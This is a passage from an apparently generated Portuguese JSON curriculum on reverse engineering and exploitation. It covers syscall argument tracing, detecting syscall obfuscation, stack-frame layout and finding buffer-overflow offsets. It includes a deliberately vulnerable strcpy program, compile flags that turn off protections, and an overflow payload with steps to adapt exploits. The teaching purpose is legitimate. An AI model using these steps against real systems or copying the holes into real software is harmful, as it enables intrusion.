                                  "subSteps": [
                                    "Consulte a convenção de chamada: x86_64 Linux usa RDI (arg1), RSI (arg2), RDX (arg3), etc.",
                                    "No momento da syscall, anote valores ou fontes em cada registrador (ex: MOV RDI, [RIP+offset]).",
                                    "Identifique se args são imediatos, registradores ou loads de memória.",
                                    "Documente em uma tabela: Registrador | Syscall Arg | Tipo esperado (fd, ptr, string).",
                                    "Verifique alinhamento de pilha se aplicável."
                                  ],
                                  "verification": "Crie um diagrama mostrando registradores mapeados corretamente para uma syscall conhecida como open().",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Documentação de ABI Linux (System V ABI)",
                                    "Ferramenta de desassembly"
                                  ],
                                  "tips": "Use 'af' no radare2 para análise de funções; memorize ordem: RDI, RSI, RDX, RCX, R8, R9.",
                                  "learningObjective": "Entender e mapear parâmetros de syscalls por arquitetura.",
                                  "commonMistakes": [
                                    "Usar convenção errada (Windows vs Linux)",
                                    "Esquecer args em pilha para syscalls antigas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Rastrear fluxo de dados para trás (backward data flow)",
                                  "subSteps": [
                                    "Escolha um arg (ex: RDI) e vá para instruções anteriores: procure MOV, LEA para esse registrador.",
                                    "Siga chains: se MOV RDI, [RBX], rastreie RBX; use XREFs para memória.",
                                    "Identifique fontes: loads de .data (strings), heap (malloc), stack (locais).",
                                    "Anote o path completo: Syscall <- MOV RDI, addr <- LEA addr, string.",
                                    "Repita para todos args relevantes."
                                  ],
                                  "verification": "Trace o path completo de um arg até a origem e identifique se é uma string ou ponteiro.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta com graph view (Ghidra decompiler)",
                                    "Marcadores/notas para paths"
                                  ],
                                  "tips": "Use 'VV' no radare2 para graph; foque em defs/uses analysis.",
                                  "learningObjective": "Executar análise de fluxo de dados manual para parâmetros dinâmicos.",
                                  "commonMistakes": [
                                    "Perder branches condicionais",
                                    "Ignorar XOR/negations que zeram regs"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e validar os parâmetros rastreados",
                                  "subSteps": [
                                    "Classifique: ponteiro para string? (ver PUSH string ou LEA); fd de dup/open?",
                                    "Extraia strings/ptr: use hexdump ou ferramenta para dump memória.",
                                    "Simule execução: use gdb com 'gef' ou pwndbg para breakpoints na syscall.",
                                    "Confirme dinamicamente: rode binário sob strace para args reais.",
                                    "Documente achados: 'Arg1: ptr para \"/bin/sh\" em 0x401000'."
                                  ],
                                  "verification": "Explique o propósito da syscall baseado no rastreamento (ex: spawn shell).",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GDB com plugins (gef/pwndbg)",
                                    "strace",
                                    "Binário de teste"
                                  ],
                                  "tips": "Para strings, procure NULL-terminator; valide com 'info registers' no gdb.",
                                  "learningObjective": "Interpretar fluxos para identificar payloads ou acessos maliciosos.",
                                  "commonMistakes": [
                                    "Assumir ptr sem verificar bounds",
                                    "Não validar dinamicamente em binários ofuscados"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário ELF x86_64 que chama execve (syscall 59): RAX=59, RDI=ptr para '/bin/sh' (rastreado de .data via LEA RDI, [rip+0x123]), RSI=ptr argv[0] (stack), RDX=NULL envp. Isso revela um shell spawner em malware.",
                              "finalVerifications": [
                                "Rastreie todos args de uma syscall open() até origem.",
                                "Identifique uma string dinâmica carregada em arg1.",
                                "Explique por que um arg é um ponteiro vs valor imediato.",
                                "Valide com strace mostrando args idênticos.",
                                "Crie diagrama de fluxo para 3 syscalls diferentes.",
                                "Detecte ofuscação simples em um arg (ex: XOR decode)."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento de registradores (100% correto).",
                                "Paths de fluxo completos e sem gaps para todos args.",
                                "Interpretação correta de tipos (string, fd, ptr).",
                                "Validação dinâmica alinhada com análise estática.",
                                "Documentação clara com diagramas ou tabelas.",
                                "Tratamento de fluxos condicionais ou múltiplos paths."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly: Entender MOV/LEA e registradores.",
                                "Sistemas Operacionais: Tabelas de syscalls e ABIs.",
                                "Engenharia Reversa: Uso de Ghidra/IDA para XREFs.",
                                "Análise de Malware: Identificar C2 ou droppers.",
                                "Debugging: GDB para validação dinâmica."
                              ],
                              "realWorldApplication": "Em análise de malware, rastrear syscalls como read/write revela exfiltração de dados; em CTFs/forensics, identifica flags em strings dinâmicas ou acessos privilegiados em rootkits."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.3.4",
                            "name": "Detectar ofuscação de syscalls",
                            "description": "Identificar técnicas como cálculos dinâmicos do número da syscall ou indireção de registradores em malware ou binários protegidos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar chamadas de syscall padrão em assembly x86/x64",
                                  "subSteps": [
                                    "Estude a convenção de chamadas de syscall em Linux (syscall instruction com RAX como número da syscall)",
                                    "Identifique registradores padrão: RAX para número da syscall, RDI/RSI etc. para argumentos",
                                    "Desmonte um binário simples com objdump ou Ghidra para visualizar syscalls diretas",
                                    "Compare com chamadas int 0x80 em sistemas legados",
                                    "Anote números comuns de syscalls (ex: 1 para write, 60 para exit em x64)"
                                  ],
                                  "verification": "Desmonte um binário hello world e liste 3 syscalls diretas com seus números corretos",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ghidra ou IDA Free",
                                    "Binário de teste simples (ex: hello world compilado com gcc -static)"
                                  ],
                                  "tips": "Use 'objdump -d binary' para visualização rápida inicial",
                                  "learningObjective": "Compreender o formato baseline de syscalls não ofuscadas",
                                  "commonMistakes": [
                                    "Confundir convenções x86 vs x64",
                                    "Ignorar alinhamento de registradores"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar técnicas comuns de ofuscação de syscalls",
                                  "subSteps": [
                                    "Aprenda ofuscação por cálculo dinâmico: ex: XOR com constante para mascarar número da syscall",
                                    "Estude indireção de registradores: mov rax, [reg] ou lea rax, [rip + offset]",
                                    "Reconheça syscalls em tabelas ou via pointers indiretos",
                                    "Analise exemplos de ofuscação como rotação de bits ou adição/subtração dinâmica",
                                    "Liste 5 técnicas: dynamic computation, register indirection, syscall table lookup, conditional jumps, anti-disassembly tricks"
                                  ],
                                  "verification": "Descreva em um diagrama 3 técnicas de ofuscação com pseudocódigo assembly",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação de syscalls (man syscalls)",
                                    "Exemplos de malware PoC no GitHub (ex: syscall obfuscation samples)"
                                  ],
                                  "tips": "Procure padrões matemáticos suspeitos perto de 'syscall' instruction",
                                  "learningObjective": "Reconhecer padrões de ofuscação específicos em código assembly",
                                  "commonMistakes": [
                                    "Focar só em strings, ignorar ops matemáticas",
                                    "Não considerar ofuscação runtime"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar binários desmontados para detectar ofuscação",
                                  "subSteps": [
                                    "Carregue um binário suspeito no Ghidra ou Radare2 e navegue para funções com 'syscall'",
                                    "Procure instruções antes de syscall: ops em RAX como add/sub/xor/mov de memória",
                                    "Trace fluxos de dados com graph view para ver origens do valor em RAX",
                                    "Use scripts simples em r2 ou Ghidra para destacar syscalls ofuscadas",
                                    "Compare com baseline: se RAX não é imediato direto, marque como suspeito"
                                  ],
                                  "verification": "Em um binário de teste ofuscado, identifique e explique 2 instâncias de ofuscação",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Radare2 ou Ghidra instalado",
                                    "Binários de teste: um normal e um ofuscado (ex: crackme com syscall obfuscation)"
                                  ],
                                  "tips": "Use 'aa' em r2 para análise automática, depois 'pdf @ syscall' para funções",
                                  "learningObjective": "Aplicar ferramentas de disassembly para detecção prática",
                                  "commonMistakes": [
                                    "Não seguir data flow completo",
                                    "Confundir otimização legítima com ofuscação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Confirmar detecção e documentar achados",
                                  "subSteps": [
                                    "Execute o binário em debugger (gdb ou x64dbg) e breakpoint em syscall para inspecionar RAX runtime",
                                    "Modifique o binário para remover ofuscação e compare comportamento",
                                    "Gere relatório: técnica usada, localização (offset), impacto na análise",
                                    "Teste em múltiplas amostras para validar detecção",
                                    "Discuta evasão: como ofuscação evita hooks de monitoramento"
                                  ],
                                  "verification": "Produza um relatório de 1 página com análise de um binário real/ofuscado",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB ou WinDbg",
                                    "Binário de malware sample seguro (ex: de VirusTotal ou PoC)"
                                  ],
                                  "tips": "Use 'strace' no Linux para correlacionar syscalls observadas vs desmontadas",
                                  "learningObjective": "Validar detecções dinamicamente e relatar profissionalmente",
                                  "commonMistakes": [
                                    "Análise estática só, sem validação runtime",
                                    "Relatórios vagos sem offsets/hex dumps"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário ofuscado: mov eax, 0xdeadbeef; xor eax, 0xcafebabe; syscall (resulta em write syscall após XOR). Detecte rastreando o XOR dinâmico em RAX antes da syscall.",
                              "finalVerifications": [
                                "Desmonte e detecte ofuscação em 3 binários de teste variados",
                                "Explique data flow de uma syscall ofuscada em debugger",
                                "Gere relatório identificando pelo menos 2 técnicas por amostra",
                                "Diferencie ofuscação de otimização em código legítimo",
                                "Correlacione syscalls ofuscadas com comportamento via strace",
                                "Modifique ofuscação e confirme mudança no número da syscall"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de 80% das ofuscações em testes",
                                "Explicação clara de técnicas com exemplos de assembly",
                                "Uso correto de ferramentas (Ghidra/Radare2/GDB)",
                                "Relatório estruturado com offsets, hex dumps e impactos",
                                "Diferenciação entre ofuscação maliciosa e código otimizado",
                                "Validação runtime via debugging ou tracing"
                              ],
                              "crossCurricularConnections": [
                                "Análise de Binários: Data flow e control flow graphs",
                                "Assembly Reversing: Registradores e instruções aritméticas",
                                "Malware Analysis: Evasão de detecção e anti-RE",
                                "Operating Systems: Syscall interfaces e hooking",
                                "Debugging: Breakpoints e runtime inspection"
                              ],
                              "realWorldApplication": "Em análise de malware, detectar ofuscação de syscalls em rootkits ou trojans permite bypass de monitoramento (ex: hiding file access), essencial para threat hunting em SOCs ou pesquisa de vulnerabilidades zero-day."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.4",
                "name": "Injeção e Execução de Código Arbitrário",
                "description": "Técnicas de exploração como buffer overflow, shellcodes e return-oriented programming.",
                "totalSkills": 47,
                "atomicTopics": [
                  {
                    "id": "10.1.4.1",
                    "name": "Buffer Overflow",
                    "description": "Técnica de exploração que explora sobrescrita de buffer na pilha para redirecionar o fluxo de execução e injetar código arbitrário.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.1.1.1",
                        "name": "Layout da Pilha em Funções",
                        "description": "Compreender a estrutura da pilha (stack) em arquiteturas x86 (32 bits) e x64 (64 bits), incluindo alocação de buffers locais, parâmetros de função, endereço de retorno (return address), saved base pointer (EBP/RBP) e frames de pilha, essencial para identificar pontos de sobrescrita em buffer overflows.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.1.1.1.1",
                            "name": "Identificar componentes da pilha em assembly",
                            "description": "Analisar código assembly gerado por compiladores (GCC/Clang) para mapear buffers locais, endereço de retorno e registradores EBP/RBP em funções vulneráveis, usando ferramentas como objdump ou GDB.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e compilar código C vulnerável",
                                  "subSteps": [
                                    "Escreva ou obtenha um código C simples com buffer local vulnerável (ex: strcpy em buffer de 32 bytes).",
                                    "Compile com flags de depuração: gcc -m32 -fno-stack-protector -z execstack -no-pie -g -o vuln vuln.c para x86.",
                                    "Execute objdump -d vuln > assembly.txt para gerar listing de assembly.",
                                    "Revise o código fonte para entender a estrutura da função vulnerável.",
                                    "Confirme que não há proteções como stack canary ativadas."
                                  ],
                                  "verification": "Verifique se o binário foi gerado e o assembly.txt contém o disassembly da função main ou vulnerável.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto (VS Code)",
                                    "GCC/Clang instalado",
                                    "Objdump (parte do binutils)"
                                  ],
                                  "tips": "Use -m32 para arquitetura 32-bit para simplicidade no estudo da pilha.",
                                  "learningObjective": "Configurar um ambiente controlado para análise de stack em assembly x86.",
                                  "commonMistakes": [
                                    "Esquecer flags como -fno-stack-protector, ativando proteções indesejadas.",
                                    "Compilar em 64-bit sem ajustes para RBP."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Disassemblar e localizar a função vulnerável no assembly",
                                  "subSteps": [
                                    "Abra o assembly.txt e procure pela label da função (ex: <main>:).",
                                    "Identifique o prólogo da função: push ebp; mov ebp, esp.",
                                    "Localize sub esp, NNN para alocação de espaço na stack (buffers locais).",
                                    "Anote endereços de instruções chave como início da função e chamadas a strcpy/vuln funcs.",
                                    "Marque o epílogo: leave ou mov esp, ebp; pop ebp; ret."
                                  ],
                                  "verification": "Anote a posição exata do prólogo e epílogo da função no listing.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "assembly.txt gerado",
                                    "Editor de texto com busca (ex: grep 'main:' assembly.txt)"
                                  ],
                                  "tips": "Use grep ou vim para buscar padrões como 'push ebp' ou 'sub esp'.",
                                  "learningObjective": "Navegar e interpretar o layout básico de uma função em assembly x86.",
                                  "commonMistakes": [
                                    "Confundir funções; sempre confirme labels.",
                                    "Ignorar alinhamentos de stack (geralmente múltiplos de 4 ou 16 bytes)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear componentes da pilha: buffer local, saved EBP/RBP e return address",
                                  "subSteps": [
                                    "No prólogo, note que [ebp] = saved EBP (pai).",
                                    "[ebp+4] = return address (próxima instrução após call).",
                                    "Calcule offset do buffer: após sub esp, NNN, buffer está em [ebp - offset] (ex: [ebp-32] para buffer de 32 bytes).",
                                    "Trace acessos ao buffer via lea ou mov para [ebp - X].",
                                    "Desenhe um diagrama da stack: high addr (params) -> saved EBP -> ret addr -> locals (buffer baixo addr)."
                                  ],
                                  "verification": "Crie um sketch da stack frame anotando offsets exatos para buffer, EBP e ret addr.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Papel/caneta ou draw.io para diagrama",
                                    "assembly.txt"
                                  ],
                                  "tips": "Lembre: stack cresce para baixo (decrescente); EBP é âncora.",
                                  "learningObjective": "Mapear precisamente os offsets dos componentes críticos da stack em funções vulneráveis.",
                                  "commonMistakes": [
                                    "Inverter ordem: buffer é abaixo (negativo) de EBP.",
                                    "Não considerar padding/alignment após locals."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar mapeamento usando GDB para confirmação dinâmica",
                                  "subSteps": [
                                    "Inicie gdb ./vuln, defina breakpoint na entrada da função (b main).",
                                    "Execute run, então info registers para ver EBP/ESP.",
                                    "Use x/20wx $esp para examinar memória da stack.",
                                    "Passo a passo com si/stepi, observe mudanças em EBP e acessos ao buffer.",
                                    "Confirme return address com x/wx $ebp+4 antes do ret."
                                  ],
                                  "verification": "Screenshot ou notas mostrando valores reais de EBP, buffer e ret addr no GDB.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GDB instalado",
                                    "Binário vuln"
                                  ],
                                  "tips": "Use layout asm no GDB para view side-by-side source/assembly.",
                                  "learningObjective": "Correlacionar análise estática (objdump) com dinâmica (GDB) para validação.",
                                  "commonMistakes": [
                                    "Executar sem breakpoint, perdendo controle.",
                                    "Confundir registradores em runtime vs static."
                                  ]
                                }
                              ],
                              "practicalExample": "Considere código C: int main() { char buf[32]; strcpy(buf, argv[1]); }. Compile como acima. No assembly: sub $0x24, %esp (36 bytes alocados). Buffer em [%ebp-0x24], saved ebp [%ebp], ret [%ebp+4]. No GDB, após strcpy, x/10wx $ebp-0x30 mostra overflow pisando ret addr.",
                              "finalVerifications": [
                                "Pode calcular offset exato do buffer a partir do sub esp.",
                                "Identifica corretamente saved EBP em [ebp] e ret em [ebp+4].",
                                "Desenha diagrama preciso da stack frame com offsets.",
                                "Valida com GDB mostrando valores reais em memória.",
                                "Explica como overflow no buffer sobrepõe ret addr."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos offsets mapeados (100% match com GDB).",
                                "Diagrama claro e rotulado da stack.",
                                "Explicação coerente de prólogo/epílogo.",
                                "Uso correto de ferramentas (objdump/GDB sem erros).",
                                "Identificação de vulnerabilidade de overflow."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Entender calling conventions e stack frames.",
                                "Programação em C: Gerenciamento manual de memória e strings.",
                                "Debugging e Ferramentas: Uso avançado de GDB e disassemblers.",
                                "Engenharia Reversa: Análise de binários para pentest."
                              ],
                              "realWorldApplication": "Em auditorias de segurança, pentesters usam isso para encontrar buffer overflows em binários legados, craftando exploits que sobrescrevem return address para shellcode execution em CTFs ou real breaches como EternalBlue."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.1.2",
                            "name": "Simular alocação de pilha em chamadas de função",
                            "description": "Usar debuggers como GDB para observar o crescimento e encolhimento da pilha durante chamadas recursivas ou com múltiplos parâmetros, identificando offsets exatos entre buffer e endereço de retorno.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de depuração com GDB",
                                  "subSteps": [
                                    "Instale o GCC e GDB no seu sistema (ex: Ubuntu: sudo apt install build-essential gdb).",
                                    "Crie um arquivo C simples com uma função que aloca um buffer local e chama outra função.",
                                    "Compile o código com símbolos de debug: gcc -g -o programa programa.c -fno-stack-protector -z execstack.",
                                    "Inicie o GDB: gdb ./programa.",
                                    "Defina breakpoints na entrada e saída de funções relevantes."
                                  ],
                                  "verification": "Confirme que o executável roda no GDB sem erros e breakpoints são atingidos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GCC",
                                    "GDB",
                                    "Editor de texto",
                                    "Código C de exemplo"
                                  ],
                                  "tips": "Use -fno-stack-protector para desabilitar proteções modernas e observar pilha clássica.",
                                  "learningObjective": "Preparar um ambiente realista para depuração de pilha sem interferências de ASLR ou canaries.",
                                  "commonMistakes": [
                                    "Esquecer -g para símbolos de debug",
                                    "Deixar stack protector ativo",
                                    "Não usar -z execstack em sistemas modernos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Examinar o layout da pilha em uma chamada de função simples",
                                  "subSteps": [
                                    "Execute até o breakpoint na função principal: run.",
                                    "Examine o frame atual: info frame e x/20x $rsp.",
                                    "Chame uma função simples e observe: step ou next até a chamada.",
                                    "No frame da função chamada, identifique buffer local, parâmetros e endereço de retorno: info registers rsp.",
                                    "Use bt para backtrace e compare endereços.",
                                    "verification"
                                  ],
                                  "verification": "Identifique visualmente o endereço de retorno logo após o buffer no dump da memória.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GDB ativo com programa carregado"
                                  ],
                                  "tips": "Use 'x/10gx $rsp' para dump hexadecimal de 10 words da pilha.",
                                  "learningObjective": "Visualizar componentes básicos de um stack frame: parâmetros, buffer, saved BP, return address.",
                                  "commonMistakes": [
                                    "Confundir RSP com RBP",
                                    "Não alinhar dumps de memória corretamente",
                                    "Ignorar alinhamento de 8 bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Observar impacto de múltiplos parâmetros na alocação da pilha",
                                  "subSteps": [
                                    "Modifique o código para uma função com 3-5 parâmetros (int, char*, etc.).",
                                    "Execute novamente e chame a função: observe 'info args' e 'x/20x $rsp'.",
                                    "Compare offsets: parâmetros empilhados da direita para esquerda.",
                                    "Aumente parâmetros e veja crescimento da pilha: disas main.",
                                    "Volte à main e confirme encolhimento ao retornar: finish."
                                  ],
                                  "verification": "Liste offsets exatos dos parâmetros em relação ao buffer local.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Código C atualizado",
                                    "GDB"
                                  ],
                                  "tips": "Parâmetros >6 usam registrados em x64; foque em convenção de chamada System V.",
                                  "learningObjective": "Entender como parâmetros múltiplos alteram offsets e tamanho do frame.",
                                  "commonMistakes": [
                                    "Assumir ordem esquerda-direita",
                                    "Não considerar registradores para params",
                                    "Confundir stack growth direction"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular chamadas recursivas e monitorar crescimento/encolhimento da pilha",
                                  "subSteps": [
                                    "Implemente uma função recursiva simples (ex: fatorial com buffer local).",
                                    "Execute com input para 4-5 níveis de recursão: run 5.",
                                    "Use bt para ver múltiplos frames: observe RSP decrescendo.",
                                    "Step out de frames e veja RSP crescendo de volta.",
                                    "Dump pilha em níveis profundos: x/50x $rsp para ver padrões repetidos."
                                  ],
                                  "verification": "Descreva como cada recursão adiciona ~32-64 bytes (buffer + ret + bp).",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Código C com recursão",
                                    "GDB"
                                  ],
                                  "tips": "Limite recursão para evitar stack overflow durante aprendizado.",
                                  "learningObjective": "Visualizar pilha dinâmica em recursão e calcular profundidade máxima.",
                                  "commonMistakes": [
                                    "Causar stack overflow real",
                                    "Não usar bt para navegar frames",
                                    "Ignorar overhead de cada frame"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Identificar offsets exatos entre buffer e endereço de retorno para buffer overflow",
                                  "subSteps": [
                                    "Crie função vulnerável: void func(char buf[32]) { char local[64]; strcpy(local, buf); }.",
                                    "Compile e rode: injete string longa no GDB para overflow simulado.",
                                    "Examine pilha no crash ou breakpoint: encontre offset exato do buffer base ao ret addr.",
                                    "Calcule: use pattern_create (ex: gdb-peda) para offset preciso.",
                                    "Teste com payload: observe controle de EIP/RIP alterado."
                                  ],
                                  "verification": "Forneça offset exato (ex: buffer[64] sobecreve ret addr) com dump de prova.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "GDB plugins como peda",
                                    "Código vulnerável"
                                  ],
                                  "tips": "Instale gdb-peda: echo 'source ~/peda/peda.py' >> ~/.gdbinit.",
                                  "learningObjective": "Precisar offsets para crafting exploits em buffer overflows.",
                                  "commonMistakes": [
                                    "Errar tamanho do buffer local",
                                    "Não contabilizar saved BP",
                                    "Ignorar alinhamento"
                                  ]
                                }
                              ],
                              "practicalExample": "Considere este código C: #include <string.h> void vuln(char *input) { char buffer[64]; strcpy(buffer, input); } int main(int argc, char** argv) { vuln(argv[1]); return 0; }. Compile com gcc -g -fno-stack-protector -z execstack -o vuln vuln.c. No GDB: run $(python -c 'print(\"A\"*100)'). Use 'pattern offset' no peda para achar que offset 76 sobecreve return address, confirmando buffer[64] + saved_bp[8] = ret[8].",
                              "finalVerifications": [
                                "Explicar verbalmente o layout: params -> ret addr -> saved BP -> locals/buffer.",
                                "Usar GDB para dump pilha mostrando offsets exatos em recursão.",
                                "Simular overflow controlando EIP com payload crafted.",
                                "Calcular tamanho máximo de payload sem corromper BP.",
                                "Comparar pilha em x86 vs x64 (alinhamento).",
                                "Identificar encolhimento da pilha em backtrace completo."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos offsets identificados (±1 byte).",
                                "Dumps de GDB corretos com anotações de componentes.",
                                "Explicação coerente de crescimento/encolhimento em recursão.",
                                "Payload funcional para hijack de controle sem crashes prematuros.",
                                "Uso correto de comandos GDB (info frame, x/$rsp, bt).",
                                "Identificação de 3+ erros comuns em cenários reais."
                              ],
                              "crossCurricularConnections": [
                                "Linguagem Assembly: Leitura de instruções PUSH/POP e CALL/RET.",
                                "Sistemas Operacionais: Gerenciamento de stack e limites de thread.",
                                "Segurança da Informação: Crafting de exploits ROP em buffer overflows.",
                                "Arquitetura de Computadores: Convenções de chamada ABI (System V).",
                                "Programação em C: Ponteiros, arrays e alocação estática."
                              ],
                              "realWorldApplication": "Em pentesting e análise de malware, engenheiros de segurança usam GDB para mapear stacks em binários vulneráveis, calculando offsets precisos para exploits como shellcode injection em buffer overflows, essencial em CTFs, bug bounties e reverse engineering de firmware."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.1.3",
                            "name": "Comparar pilha em 32 e 64 bits",
                            "description": "Examinar diferenças no layout da pilha entre x86 e x64, como alinhamento de 8 bytes, uso de registradores para parâmetros (System V ABI) e impacto em offsets de overflow.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar o Layout da Pilha em Arquitetura x86 (32 bits)",
                                  "subSteps": [
                                    "Compilar um programa simples em modo 32 bits usando gcc -m32.",
                                    "Usar GDB para examinar o estado da pilha durante uma chamada de função (ex: esp, ebp).",
                                    "Identificar componentes: parâmetros na pilha, saved EBP, endereço de retorno, variáveis locais.",
                                    "Desenhar um diagrama manual do layout da pilha mostrando offsets relativos.",
                                    "Testar um buffer overflow simples para observar o impacto nos offsets."
                                  ],
                                  "verification": "Gerar um diagrama da pilha x86 e simular um overflow que sobrepõe o return address em +12 bytes do buffer.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GCC com suporte a -m32",
                                    "GDB",
                                    "Editor de texto para código C/Assembly",
                                    "Papel e caneta para diagrama"
                                  ],
                                  "tips": "Use 'info registers' e 'x/20wx $esp' no GDB para visualizar a pilha claramente.",
                                  "learningObjective": "Entender o layout padrão da pilha em x86, incluindo ordem de empilhamento e offsets típicos.",
                                  "commonMistakes": [
                                    "Confundir ordem de parâmetros (da direita para esquerda)",
                                    "Ignorar alinhamento de 4 bytes",
                                    "Não considerar o prologue/epilogue da função"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Layout da Pilha em Arquitetura x64 (64 bits)",
                                  "subSteps": [
                                    "Compilar o mesmo programa em modo 64 bits usando gcc -m64.",
                                    "Usar GDB para inspecionar registradores (rsp, rbp) e pilha durante chamadas.",
                                    "Notar uso de registradores para primeiros parâmetros (System V ABI: rdi, rsi, rdx, rcx, r8, r9).",
                                    "Examinar alinhamento de 8 bytes e shadow space no Windows (se aplicável).",
                                    "Desenhar diagrama da pilha x64 destacando parâmetros restantes na pilha."
                                  ],
                                  "verification": "Identificar que apenas parâmetros além dos 6 primeiros vão para a pilha e rsp está alinhado a 16 bytes.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GCC",
                                    "GDB",
                                    "Código C de exemplo com múltiplos parâmetros",
                                    "Documentação System V ABI"
                                  ],
                                  "tips": "Compile com -fno-stack-protector para simplicidade; use 'disassemble main' para ver prologue.",
                                  "learningObjective": "Compreender mudanças no calling convention x64, foco em registradores e alinhamento.",
                                  "commonMistakes": [
                                    "Assumir todos parâmetros na pilha como em x86",
                                    "Esquecer shadow space de 32 bytes no Windows",
                                    "Ignorar alinhamento rsp % 16 == 0"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Diferenças Chave entre Pilhas x86 e x64",
                                  "subSteps": [
                                    "Listar diferenças: tamanho de ponteiros (4 vs 8 bytes), alinhamento (4 vs 8/16 bytes), passing de args.",
                                    "Criar tabela comparativa de offsets para buffer local até return address.",
                                    "Simular em GDB: calcular offset de overflow em ambos arquiteturas para mesmo código fonte.",
                                    "Analisar impacto em ROP chains (gadgets mais distantes em x64 devido a maiores offsets).",
                                    "Documentar como System V ABI afeta exploits (menos args na pilha)."
                                  ],
                                  "verification": "Produzir tabela com offsets exatos e explicar por que overflow em x86 é +12 mas x64 é +24.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "GDB sessions de 32 e 64 bits",
                                    "Planilha ou Markdown para tabela",
                                    "Exemplo de vulnerable C code"
                                  ],
                                  "tips": "Use objdump -d para assembly; compare dumps binários de 32/64 bits.",
                                  "learningObjective": "Identificar e quantificar diferenças impactantes em análise de vulnerabilidades.",
                                  "commonMistakes": [
                                    "Não ajustar offsets para tamanho de ponteiro",
                                    "Confundir ABI Linux (System V) com Windows",
                                    "Subestimar efeito de registradores em payloads"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Impacto em Exploração de Buffer Overflow",
                                  "subSteps": [
                                    "Adaptar um exploit x86 para x64, ajustando offsets e shellcode.",
                                    "Testar em ambiente controlado (ex: vulnerable server 32 vs 64).",
                                    "Explorar mitigações extras em x64 (ASLR, NX, mas foco em layout).",
                                    "Calcular payloads: RSP inicial, shadow space, offsets para RBP/RET.",
                                    "Verificar sucesso com netcat ou similar."
                                  ],
                                  "verification": "Executar exploits bem-sucedidos em ambos, documentando diferenças nos payloads.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "VMs ou Docker com 32/64 bit",
                                    "GDB, pwndbg",
                                    "Netcat",
                                    "Vulnerable binary examples"
                                  ],
                                  "tips": "Use pattern_create.rb (metasploit) para encontrar offsets exatos automaticamente.",
                                  "learningObjective": "Aplicar comparações para desenvolver exploits portáteis entre arquiteturas.",
                                  "commonMistakes": [
                                    "Payloads x86 com jmp esp (use ret em x64)",
                                    "Não alinhar RSP antes de shellcode",
                                    "Esquecer args em registradores para funções chamadas"
                                  ]
                                }
                              ],
